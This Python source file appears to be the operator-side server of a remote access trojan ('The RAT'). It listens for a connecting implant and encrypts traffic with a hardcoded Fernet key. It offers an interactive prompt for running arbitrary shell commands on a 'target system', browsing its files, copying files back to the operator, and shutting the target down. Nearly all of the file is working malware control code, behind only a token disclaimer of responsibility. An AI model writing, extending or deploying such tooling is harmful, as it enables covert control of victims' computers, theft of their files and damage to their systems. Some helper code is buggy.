#Created:Mar2023  TimeTaken:Approx1week
#AdhritTheGreat
import time
try:
    from cryptography.fernet import Fernet
    import socket
    import random
    import subprocess
    import os
    from termcolor import colored
    import json
except Exception as e:
    print("Major exception:\n")
    time.sleep(5)
    print(e,"\n\n")
    time.sleep(3)
    exit()



#Incase of an error, close server.py and rerun (client will not close and will be waiting)
terminal_accept=1000000
PORT=4004
HOST = '127.0.0.1'


host_name = socket.gethostname()
ip=socket.gethostbyname(host_name)
print("This device's IP:",ip)
print(" ")

key=b'ObcwFG1Wp9noy1MniE5nN2BzfpwrUO0z10HQKQhYFqE='
fernet=Fernet(key)
terminal_activated=False
file_activated=False
time.sleep(5)

def clear():
    rows, cols = os.get_terminal_size()
    print("\n"*cols)
def banner():
    colors=["blue",'cyan']

    t1=r'''
___________.__             __________    ________________
\__    ___/|  |__   ____   \______   \  /  _  \__    ___/
  |    |   |  |  \_/ __ \   |       _/ /  /_\  \|    |
  |    |   |   Y  \  ___/   |    |   \/    |    \    |
  |____|   |___|  /\___  >  |____|_  /\____|__  /____|
                \/     \/          \/         \/-ᴀᴅʜʀɪᴛ
ⁱ ᵃᵐ ⁿᵒᵗ ʳᵉˢᵖᵒⁿˢⁱᵇˡᵉ ᶠᵒʳ ⁱᵐᵖʳᵒᵖᵉʳ ᵘˢᵉ ᵒᶠ ᵗʰⁱˢ ᵖʳᵒᵍʳᵃᵐ '''
    for char in t1:
        colour=random.choice(colors)
        print(colored(char,colour), end='', flush=True)
        time.sleep(0.005) # adjust the delay time as needed
    print(" ")
clear()
banner()


def updating_print(message,exta_char=".",number=5,final=""):
    number=int(number)
    list=[0.3,0.5,0.8,1.1,1.4,1.7]
    print(str(message), end='', flush=True)
    number=number-1
    while number>0:
        tim=random.choice(list)
        time.sleep(tim)
        number=number-1
        print(str(exta_char), end='', flush=True)
    if not final:
        tim=random.choice(list)
        time.sleep(tim)
        print(str(exta_char), flush=True)
        tim=random.choice(list)
        time.sleep(tim)
    else:
        tim=random.choice(list)
        time.sleep(tim)
        print(str(exta_char), end='', flush=True)
        tim=random.choice(list)
        time.sleep(tim+1)
        x=" "+final
        time.sleep(1)
        print(x, flush=True)
    time.sleep(1.5)
def encrypt(message):
    encMessage = fernet.encrypt(message.encode())
    return encMessage
def decrypt(message):
    deMessage = fernet.decrypt(message).decode()
    return deMessage
def send_command(conn, command):
    encrypted_message = encrypt(command)
    conn.sendall(encrypted_message)
def receive_output(conn):
    output = b""
    while True:
        data = conn.recv(4096)
        if not data:
            break
        en_output += data
        output=decrypt(data)
    return output
def run_command(command):
    process = subprocess.run(command, shell=True, capture_output=True, text=True)
    output=process.stdout
    print(output)
    return str(output)




for_close=True
time.sleep(12)

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    if for_close:
        s.bind((HOST, PORT))
        s.listen()
        time.sleep(1)
        print(f"Server listening on {HOST}:{PORT}")
        conn, addr = s.accept()
        time.sleep(1)
    with conn:
        if for_close:
            print(f"Found:{addr}\n")
            time.sleep(1)
            updating_print("Trying to connect",colored(".", "green"),7,colored("✓", "green"))
            time.sleep(2)
            print("Successfully connected ")
            time.sleep(4)
            print(" ")
            clear()
            print("Enter",colored("help", "blue"),"for a list of availible commands")
            time.sleep(5)
            clear()
        while True:
            en_output =b""
            time.sleep(0.5)
            command = input(colored("RAT", "red")+colored(">", "magenta")).strip()
            time.sleep(0.5)
            print(" ")
            if command=="":
                continue
            elif 'banner' in command and len(command)<7:
                banner()
            elif 'terminal' in command and len(command)<9:
                terminal_activated=True
                updating_print("Entering terminal mode",colored(".","green"),7)
                send_command(conn, command)
                time.sleep(1)
                print(" ")
                print(colored("Warning:","white",attrs=["bold"]),"Anything you type here will be run on the target system and may cause unwanted damage")
                time.sleep(3)
                print(" ")
                time.sleep(1)
                time.sleep(2)
                clear()
                print(" ")
                time.sleep(2)
                print("Enter",colored("help","blue"),"for",colored("'special'","red"),"terminal commands")
                time.sleep(10)
                clear()
                try:
                    while True:
                        en_output=b""
                        data=b""
                        time.sleep(4)
                        str=colored("RAT", "red")+colored(":","magenta",attrs=["blink"])+colored("TERMINAL", "red")+colored(">", "white",attrs=["bold"])
                        command=input(str)
                        print(" ")
                        send_command(conn, command)
                        if command.lower()=="leave":
                            break
                        while True:
                            data = conn.recv(terminal_accept)
                            if not data:
                                break
                            en_output =en_output+data
                            de_output=decrypt(en_output).strip()
                            time.sleep(0.4)
                            if (len(de_output.strip())<1) or (not de_output):
                                print("No output received....An error might have occoured or no such command exists")
                                print(de_output)
                                time.sleep(0.2)
                                print(" ")
                                break
                            else:
                                print(de_output)
                                break



                    time.sleep(5)
                except Exception as e:
                    print("ERROR ON SERVER SIDE: ")
                    print(e)
            elif 'shut' in command and 'down' in command and len(command)<10:
                print("Are you sure you want to shut down the target computer")
                if "y" in input("Y/n>").strip().lower():
                    send_command(conn, command)
            elif "files" in command and len(command)<7:
                inpat="files"
                send_command(conn, inpat)
                updating_print("Entering files mode",colored(".","green"),7)
                time.sleep(3)
                print(" ")
                time.sleep(1)
                time.sleep(2)
                clear()
                print(" ")
                time.sleep(2)
                print("Enter",colored("help","blue"),"for",colored("'special'","cyan",attrs=["bold"]),"files commands")
                time.sleep(12)
                clear()
                while True:
                    output=""
                    current_dir=""
                    en_output=b""
                    data = conn.recv(terminal_accept)
                    if not data:
                        break
                    en_output =en_output+data
                    de_output=decrypt(en_output).strip()
                    time.sleep(0.4)
                    out_dict=de_output.split("~`~")
                    for item in out_dict:
                        if "outputcode2438" in item and ":" in item:
                            output=item.strip("outputcode2438")
                            output=output.strip(":").strip()
                        if "current_dircode2438" in item and ":" in item:
                            current_dir=item.strip("current_dircode2438")
                            current_dir=current_dir.strip(":").strip()
                            current_dir=current_dir.replace("?","\\")
                    if "get_file " in inpat:
                        file_name = os.path.basename(inpat.strip("get_file").strip()).strip()
                        base_directory = os.path.abspath(os.sep)
                        new_folder_path = base_directory+"transferred_items"
                        if not os.path.exists(new_folder_path):
                            # Create the folder if it doesn't exist
                            os.makedirs(new_folder_path)
                            print(f"Folder '{new_folder_path}' has been created.")
                        time.sleep(4)
                        print("Saving file",file_name,"at",new_folder_path)
                        with open(new_folder_path+"\\"+file_name, 'w') as file:
                                file.write(output)

                    else:
                        print(output)
                    time.sleep(4)
                    print(" ")
                    inpat=input(current_dir+colored(">","cyan"))
                    if "leave" in inpat:
                        print('\n|Files mode closed|\n')
                        break


                    send_command(conn, inpat)
                    print("")







            else:
                send_command(conn, command)
            while True:
                if terminal_activated==True:
                    terminal_activated=False
                    break
                if file_activated==True:
                    file_activated=False
                    break
                else:
                    data = conn.recv(terminal_accept)
                    if not data:
                        break
                    en_output =en_output+data
                    de_output=decrypt(en_output)
                    time.sleep(0.4)
                    print(de_output)
                    time.sleep(0.2)
                    print(" ")
                    if de_output:
                        break
                    else:
                        continue
while True:
    time.sleep(1)
